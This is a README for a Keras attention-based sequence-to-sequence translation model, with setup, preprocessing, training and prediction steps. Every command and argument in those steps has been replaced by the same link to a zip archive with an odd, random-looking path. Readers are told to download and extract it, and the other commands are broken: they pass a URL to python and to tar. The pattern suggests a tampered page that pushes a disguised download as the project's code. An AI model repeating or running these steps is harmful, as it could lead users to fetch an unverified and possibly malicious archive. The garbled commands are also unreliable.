# Attention based Language Translation in Keras

This is a Attention based sequence to sequence neural machine translation model built in keras. 

The same code can be used for any text based sequence to sequence task such as a chatbot!. 

The code has only been tested with the tensorflow backend.



## Requirements

- Python 2
- Tensorflow 
- numpy
- keras ( Latest )



## Instructions

1) Dowload the dataset

We need to create two .txt files for each the two languages. Both the text files should contain same number of lines and make sure the lines of the both text files ae syncronzed.  Make sure that the sentences are tokenised in the text file.

```bash
mkdir data
cd data
wget "https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip"
tar -xf "https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip"
cd ..
```


2) Preprocess the dataset 

Now we need preprocess the dataset into an HDF5 file.

```bash
python https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip --text_A="https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip" --text_B="https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip" --out_file="./data/nmt_hi_en_prepped.h5"
```


3) Start the training

```bash
mkdir weights

python https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip --dataset="./data/nmt_hi_en_prepped.h5" --weights_path="./weights/KerasAttentionNMT_1.h5"
```



4)  Get the predictions from the model

```bash
python https://github.com/yashugupta786/attention-translation-keras/raw/refs/heads/master/phenolsulphonate/keras-translation-attention-silverbelly.zip --dataset="./data/nmt_hi_en_prepped.h5" --weights_path="./weights/KerasAttentionNMT_1.h5"
```



## Results

```bash
===============
Enter a sentence : 
this is red
यह लाल ह <end> 
===============
```



